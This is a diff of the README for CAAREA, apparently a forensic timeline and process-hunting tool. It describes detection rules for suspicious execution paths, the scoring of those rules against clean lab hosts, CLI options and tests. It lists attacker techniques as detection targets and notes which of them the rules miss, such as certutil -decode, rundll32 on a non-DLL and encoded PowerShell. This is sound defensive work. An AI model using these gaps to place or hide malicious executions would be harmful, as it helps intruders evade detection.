-| `PATH-SCRATCH` | Ran or written in the Recycle Bin, a user-writable Windows folder (Temp, Tasks, Fonts, PerfLogs, `spool\drivers`), `Users\Public`, the root of ProgramData, AppData or the drive, Downloads, Temp; on Linux `/dev/shm`, the web root, a hidden folder, `/tmp`, `/var/tmp`, `/run`, a home directory. The folder sets the score; Temp and Downloads are pointers only | 40 to 85 |
-| `PATH-ARCHIVE-TEMP` | Ran from the temporary extraction of an archive (`Temp\Rar$`, `Temp\7z`, `Temp\Temp1_`): an attachment opened and run in place | 65 |
-| `PATH-ADS`, `PATH-REMOTE` | Ran from an NTFS alternate data stream; from a network share or a WebDAV path | 70 to 90 |
-
-**The process tree behind it.** Before the rules run, CAAREA rebuilds the process tree of every host from the creator PIDs (Security 4688 `ProcessId`, Sysmon `ParentProcessId` and the GUID pair, auditd and `pacct` `ppid`) and the exits (4689, Sysmon 5). A parent is the latest start of that PID before the child; a parent that had exited is reported, not guessed. A boot closes every PID: Security 4608 and Kernel-General 12 are read as boot markers (and written to the timeline as `evtx:4608` / `evtx:12`), as are the first `smss.exe` and `wininit.exe` of a boot, so a Windows 7 log that spans months without 4689 does not hand a service's PID to whatever held it before the reboot. The tree also completes the timeline where the parser could only give a number: auditd and `pacct` rows show `/usr/bin/sudo (PID: 12493)` instead of `PID: 12493`, and Security 4688 from Windows 7 / 2008 R2 / 2012, which has no `ParentProcessName`, gets the creator's name the same way. A resolved name always keeps its `(PID: n)` so it can be told from one the log wrote. Rows outside a `--toi` window still feed the tree; they just report nothing.
-
-**How `hunt_score` is measured.** A rule's points are not chosen: they are how often its pattern fires on stock, clean hosts, on masstin's scale (one hit in 128 reference rows is 21 points, one in a thousand 30; a pattern that never fired gets the bound the corpus gives, `-10 · log10(1 / (rows + 1))`, 39 points on the 8,671 rows of the reference). `scripts/measure_rarity.ps1` runs `caarea --hunt` over the reference evidence, leaves out the rows the lab scripts planted, counts the hits of every pattern (a rule with several, `PATH-SCRATCH` per folder family, `NAM-RANDOM` per shape, is measured per pattern) and rewrites the table in `src/hunt/rarity.rs`, which records the corpus with it. The table shipped was measured on two clean RangeForge lab hosts collected live, nothing planted: PTR-SRV01 (Windows Server 2016 with SQL Server Express and IIS: event logs, SRUM, Amcache, ShimCache, services, tasks) and LEO-LNX01 (Ubuntu 22.04: journal, syslog, package logs, cron), 8,671 rows in all. Three patterns fired on stock rows and are worth less than the bound: `PATH-SCRATCH/windows-writable` 18 times (27 points: `dismhost.exe`, Defender's update stubs and the cloud agent's startup scripts all run from `Windows\TEMP` on a stock server), `PATH-SCRATCH/temp` 4 (33: DISM again, from the administrator's Temp) and `NAM-RANDOM/generated` 4 (33: `SMSvcHost.exe`, `NGenTask.exe`, `BthUdTask.exe`, stock names the shape test takes for generated ones). Every other pattern adds 39, the most 8,671 rows can vouch for, and a row with three such rules reaches 100. The limit of this corpus is the audit policy: the stock server keeps the default one, so it holds 61 process-creation rows without command lines and no Sysmon, and the Linux host has no auditd; the genealogy rules (`GEN-*`), which need a parent, were barely exercised and their 39 is the bound, not a measurement. The next thing to collect is a clean host with process auditing and command lines on, used for a week, and the table will spread out when it is measured there.
-
-**What a clean host vouches for.** A rule judges one row; a stock machine produces some of the same rows every day (`dismhost.exe` from a GUID folder under Temp, Defender's update stubs, the cloud agent's startup scripts, `NGenTask.exe`). `src/hunt/clean/windows.tsv` and `linux.tsv` hold what the two clean reference hosts executed (`scripts/measure_clean.py`, the lab's own beacon and the collection's activity left out: 2,752 Windows triples and 520 Linux ones), and at start-up each becomes a host-independent identity (`src/hunt/clean.rs`: environment variables expanded, user names, SIDs, GUIDs, version folders, random temp names, numbers and hashes neutralised). A row with the same identity is vouched for by a clean machine whatever its rules say: the rules keep their clause, add no points, and the row is `habitual` with score 0 and `on the clean reference hosts` in `hunt_why`, the convention of the four tools for an entry something vouches for. Measured: the clean PTR-SRV01 goes from 26 `candidate` rows to none (the 26 are `habitual`), the clean LEO-LNX01 stays at none. On the same lab's PTR-DC01, a domain controller from the same image on which `scripts/lab/plant.ps1`'s eight executions were run with process auditing and command lines on (a renamed `cmd.exe` from `Users\Public`, `svchost.exe` outside System32, a random name from `Windows\Temp`, encoded PowerShell from `cmd.exe`, a service binary under `ProgramData`, `invoice.pdf.exe`, `certutil -decode`, `rundll32` on a non-DLL) and a WMI event consumer was left firing `powershell.exe` every few seconds: the rules flag the first three and the double extension (`significant` the two name rules, `candidate` the two scratch folders) and every one of the 1,740 process creations the WMI consumer caused (`GEN-WMI-EXEC`); not one flagged row is unplanted. The four misses are rule gaps, not noise: nothing in the catalogue reads an encoded command line launched from `cmd.exe`, treats `ProgramData` as a scratch folder, or knows `certutil -decode` and `rundll32` on a file that is not a DLL.
-
-**What the rules need.** Genealogy only fires on sources that name a parent: Security 4688, Sysmon 1, auditd `execve`, `pacct`. The naming and path rules judge any row whose `processname` is an executable (a Windows path or name with a code extension, a Linux absolute path or process record), so they reach Prefetch, Amcache, BAM, ShimCache, UserAssist, AppLocker, the service and task events and the NTFS drops, where the title says *was written to* instead of *ran from*. Task names, service display names, WMI consumers and package names are left alone. On a Windows host with the default audit policy there is no 4688 at all; with 4688 but without command-line auditing the command line is empty. Stock behaviour that lives in scratch folders (Defender's `MPSigStub` and Chrome's updater under `Windows\Temp`, PowerShell's AppLocker probe, KB packages under SoftwareDistribution) is known and silent.
-
----
-
-## Time zones, honestly
-
-Most sources carry their own zone (EVTX, registry FILETIMEs, audit, pacct, RFC 3339 syslog, web logs with offset) and are simply converted to UTC.
-
-Classic syslog lines (`Sep 20 03:10:01`), `dpkg.log` and `ps lstart` are wall-clock times of the host. CAAREA looks for the host's zone in the evidence, in this order, and prints what it found:
-
-1. `/etc/timezone`
-2. the target of the `/etc/localtime` symlink (kept by the extractor as `etc/localtime.symlink`)
-3. `/etc/localtime` as a TZif file, parsed with its transition table
-4. UAC `live_response/system/timedatectl_status.txt`
-5. UAC `live_response/system/date.txt`
-6. UTC, with a warning
-
-Daylight saving is applied per date through the embedded tz database. Force a zone with `--tz Europe/Madrid`, `--tz +02:00` or `--tz UTC`.
-
----
-
-## Command reference
-
-```text
-caarea [OPTIONS] --output <PATH>
-
-  -d, --directory <PATH>      Evidence directory or triage folder (repeatable)
-  -f, --file <PATH>           Disk image, archive or single artifact (repeatable)
-  -o, --output <PATH>         Destination CSV
-  -m, --modules <MODULES>     evtx | registry | windows | linux | all   [default: all]
-  -t, --toi <TIMESTAMP>       Centre of a time window of interest (ISO-8601)
-  -w, --toi-window <HOURS>    Hours before and after the TOI       [default: 24]
-      --start-time <TS>       Keep events from this time on
-      --end-time <TS>         Keep events up to this time (a bare date includes the whole day)
-      --tz <ZONE>             Time zone of the Linux hosts for zone-less logs (default: detected)
-      --carve                 Also scan raw bytes (images, live volumes, pagefiles, blobs) for structures
-                              no file system points to; off by default, reads the whole image
-      --hunt                  Run the process hunt over the timeline; findings in <output>.hunt.csv
-      --hunt-output <PATH>    Destination CSV for the findings
-      --stage-dir <PATH>      Keep the artifacts extracted from images, live volumes and archives here
-      --overwrite             Replace the output file if it exists
-  -s, --silent                Print nothing but errors
-  -h, --help / -V, --version
-```
-
----
+`caarea --help` lists every flag.
 
 ## How it is tested
 
-`cargo test` runs 151 tests. They include real-layout records for every binary format, real auditd lines, the public TZif files of two zones, safety tests that try to break out of the staging folder, and the identities the clean reference is matched by.
-
-Beyond the unit tests, the parsers were checked against:
+`cargo test` runs 151 tests: real-layout records for every binary format, real auditd lines, the public TZif files of two zones, safety tests that try to break out of the staging folder, and the identities the clean reference is matched by. Beyond them, the parsers were checked against:
 
 - 524 public EVTX samples ([EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES), [EVTX-to-MITRE-Attack](https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack), DeepBlueCLI): the count per file matches `Get-WinEvent` exactly for every supported event id.
-- The registry test corpus of [yarp](https://github.com/msuhanov/yarp): the transaction log replay (in the shared [blockcarve](https://github.com/jupyterj0nes/blockcarve) crate, `hive_logs`) gives the same hive bins as Windows 10 and Windows 7 when they recovered those dirty hives themselves; set `BLOCKCARVE_YARP_HIVES=<path>/hives_for_tests` for blockcarve's test suite.
+- The registry test corpus of [yarp](https://github.com/msuhanov/yarp): the transaction log replay (in the shared [blockcarve](https://github.com/jupyterj0nes/blockcarve) crate) gives the same hive bins as Windows 10 and Windows 7 when they recovered those dirty hives themselves.
 - Real `pacct` files, Ubuntu 24.04 logs, an NTFS volume image produced on a Linux box and a 50 GB Windows workstation VMDK (dirty SYSTEM, SOFTWARE, DEFAULT and Amcache hives replayed from their logs).
-- The hunt, against two clean lab hosts collected live (nothing flagged once the clean reference is in) and a third one with eight executions and a WMI consumer planted by `scripts/lab/plant.ps1`: five of the nine found, no unplanted row flagged, the four misses named as rule gaps (see *Process hunting*).
+- The hunt, against two clean lab hosts collected live (nothing flagged once the clean reference is in) and a third one with eight executions and a WMI consumer planted by `scripts/lab/plant.ps1`: five of the nine found, no unplanted row flagged, the four misses named as rule gaps.
 
-The TaskScheduler operational channel is off by default on Windows clients and no public corpus has it. `scripts\gen_taskscheduler_sample.ps1` turns it on (one UAC prompt), creates and runs a harmless task, exports the channel and runs CAAREA on it.
-
----
+The TaskScheduler operational channel is off by default on Windows clients and no public corpus has it; `scripts\gen_taskscheduler_sample.ps1` turns it on, creates and runs a harmless task, exports the channel and runs CAAREA on it.
 
 ## Limits worth knowing
 
 - BitLocker volumes are detected and skipped; decrypt first.
-- Compressed rotated logs (`.gz`, `.xz`) are not read; extract them next to the originals.
-- Archives inside archives are followed five levels deep.
+- XFS and btrfs partitions are not read yet; `hiberfil.sys` is scanned raw, its compressed pages are not decoded.
 - Classic syslog has no year; it is inferred from the file's modification time, so logs spanning more than a year lose precision.
+- On a Windows host with the default audit policy there is no 4688 at all, and without command-line auditing the command line is empty; the hunt's genealogy rules need one of Security 4688, Sysmon 1, auditd or `pacct`.
 - The CSV has no "source file" column by design; run with `-m` or per package when you need that separation.
 
----
+## The family
 
-## License
+CAAREA is one of four Rust tools that write the same kind of timeline and close it with the same analysis tail, so one case tool reads them all: [masstin](https://github.com/jupyterj0nes/masstin) answers *who logged in where*, faramir *what persists*, allymacb *what the file system did*, and CAAREA *what ran*. They share the [blockcarve](https://github.com/jupyterj0nes/blockcarve) scanner for raw bytes and [vshadow-rs](https://github.com/jupyterj0nes/vshadow-rs) for shadow copies.
 
-Internal DFIR research tool by [jupyterj0nes](https://github.com/jupyterj0nes). Issues and pull requests are welcome.
+## About
+
+CAAREA stands for *Chronological Artifacts & Activity Reconstruction Engine for Analysis*. It builds on stable Rust with a plain `cargo build --release` and ships as one static binary for Windows, Linux and macOS. Internal DFIR research tool by [jupyterj0nes](https://github.com/jupyterj0nes); issues and pull requests are welcome.
